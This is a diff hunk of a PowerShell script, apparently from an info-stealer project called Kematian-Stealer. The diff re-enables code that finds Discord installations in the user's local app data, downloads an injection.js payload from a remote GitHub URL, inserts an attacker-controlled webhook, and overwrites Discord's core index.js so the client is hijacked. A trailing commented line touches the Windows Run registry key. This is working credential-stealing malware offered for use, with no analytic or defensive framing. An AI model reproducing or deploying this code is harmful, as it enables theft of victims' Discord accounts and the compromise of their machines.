@@ -889,30 +889,30 @@ function Backup-Data {
     }
 
 
-#    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
-#    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
-#
-#    foreach ($path in $discPaths) {
-#        $skibidipath = Join-Path $locAppData $path
-#        if (-not (Test-Path $skibidipath)) {
-#            continue
-#        }
-#        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
-#            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match [System.IO.Path]::GetFileName($_.FullName) -and $_.FullName -match "discord_desktop_core") -or ($_.FullName -match [System.IO.Path]::GetDirectoryName($_.FullName) -and $_.FullName -match "discord_desktop_core")) {
-#                $files = Get-ChildItem $_.FullName
-#                foreach ($file in $files) {
-#                    if ($file.Name -eq "index.js") {
-#                        $webClient = New-Object System.Net.WebClient
-#                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
-#                        if ($content -ne "") {
-#                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
-#                            $replacedContent | Set-Content -Path $file.FullName -Force
-#                        }
-#                    }
-#                }
-#            }
-#        }
-#    }
+    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
+
+    foreach ($path in $discPaths) {
+        $skibidipath = Join-Path $locAppData $path
+        if (-not (Test-Path $skibidipath)) {
+            continue
+        }
+        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
+            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
+                $files = Get-ChildItem $_.FullName
+                foreach ($file in $files) {
+                    if ($file.Name -eq "index.js") {
+                        $webClient = New-Object System.Net.WebClient
+                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/injection.js")
+                        if ($content -ne "") {
+                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
+                            $replacedContent | Set-Content -Path $file.FullName -Force
+                        }
+                    }
+                }
+            }
+        }
+    }
 
     #try {
     #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
